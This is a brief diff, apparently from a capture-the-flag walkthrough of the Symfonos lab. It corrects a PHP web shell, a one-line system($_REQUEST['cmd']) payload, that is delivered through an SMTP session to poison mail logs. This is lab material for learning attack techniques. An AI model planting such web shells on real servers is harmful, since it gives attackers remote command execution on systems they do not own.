@@ -184,7 +184,7 @@ RCPT TO:helios@symfonos.localdomain
 250 2.1.5 Ok
 DATA
 354 End data with <CR><LF>.<CR><LF>
-<?php echo system($_REQUEST['cmd']);$>
+<?php echo system($_REQUEST['cmd']);?>
 
 .
 250 2.0.0 Ok: queued as 4F54440729
